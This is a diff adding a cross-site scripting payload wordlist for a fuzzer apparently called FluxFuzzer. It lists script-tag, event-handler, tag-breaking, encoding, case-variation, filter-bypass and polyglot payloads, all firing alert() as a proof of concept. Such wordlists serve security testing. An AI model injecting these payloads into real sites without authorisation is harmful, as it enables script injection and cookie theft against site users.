@@ -1,0 +1,60 @@
+# XSS Payloads
+# FluxFuzzer XSS Wordlist
+
+# Basic XSS
+<script>alert(1)</script>
+<script>alert('XSS')</script>
+<script>alert("XSS")</script>
+<script>alert(document.domain)</script>
+<script>alert(document.cookie)</script>
+
+# Event handlers
+<img src=x onerror=alert(1)>
+<img src=x onerror="alert(1)">
+<img src="x" onerror="alert('XSS')">
+<svg onload=alert(1)>
+<svg/onload=alert(1)>
+<body onload=alert(1)>
+<input onfocus=alert(1) autofocus>
+<marquee onstart=alert(1)>
+<video src=x onerror=alert(1)>
+<audio src=x onerror=alert(1)>
+
+# Tag breaking
+"><script>alert(1)</script>
+"><img src=x onerror=alert(1)>
+'><script>alert(1)</script>
+'><img src=x onerror=alert(1)>
+</title><script>alert(1)</script>
+</textarea><script>alert(1)</script>
+--><script>alert(1)</script>
+
+# Encoding bypasses
+<script>alert(String.fromCharCode(88,83,83))</script>
+<img src=x onerror=alert(String.fromCharCode(88,83,83))>
+<script>eval(atob('YWxlcnQoMSk='))</script>
+
+# Case variation
+<ScRiPt>alert(1)</ScRiPt>
+<SCRIPT>alert(1)</SCRIPT>
+<Script>alert(1)</Script>
+
+# JavaScript URI
+javascript:alert(1)
+javascript:alert('XSS')
+javascript://comment%0aalert(1)
+data:text/html,<script>alert(1)</script>
+
+# HTML entities
+&lt;script&gt;alert(1)&lt;/script&gt;
+&#60;script&#62;alert(1)&#60;/script&#62;
+&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;
+
+# Filter bypass
+<scr<script>ipt>alert(1)</scr</script>ipt>
+<img src="x" onerror="&#97;&#108;&#101;&#114;&#116;&#40;&#49;&#41;">
+<svg><script>alert&lpar;1&rpar;</script>
+%3Cscript%3Ealert(1)%3C/script%3E
+
+# Polyglots
+jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A%0d%0a//</stYle/</titLe/</teXtarEa/</scRipt/--!>\x3csVg/<sVg/oNloAd=alert()//>\x3e
